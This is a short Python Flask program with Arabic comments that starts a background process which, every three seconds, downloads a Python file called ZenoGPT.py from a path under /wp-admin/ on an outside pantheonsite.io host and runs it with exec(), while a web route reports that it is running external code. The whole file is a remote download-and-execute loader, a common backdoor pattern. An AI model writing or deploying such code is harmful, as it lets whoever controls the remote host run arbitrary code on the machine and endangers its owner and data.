from flask import Flask
import multiprocessing
import requests
import time
import traceback

app = Flask(__name__)
url = "https://dev-ppqiwhswkwkshsh.pantheonsite.io/wp-admin/2222/ZenoGPT.py"

def run_forever():
    while True:
        try:
            response = requests.get(url)
            response.encoding = 'utf-8'
            if response.status_code == 200:
                code = response.text
                exec(code, {'__name__': '__main__'})
        except Exception as e:
            print("خطأ أثناء تنفيذ الكود المُحمّل:")
            traceback.print_exc()
        time.sleep(3)

@app.route('/')
def index():
    return "ZenoGPT يعمل ويشغل الكود الخارجي كما في محرر الأكواد."

if __name__ == '__main__':
    # تشغيل الكود في عملية مستقلة
    p = multiprocessing.Process(target=run_forever)
    p.daemon = True
    p.start()

    app.run(host='0.0.0.0', port=5000)
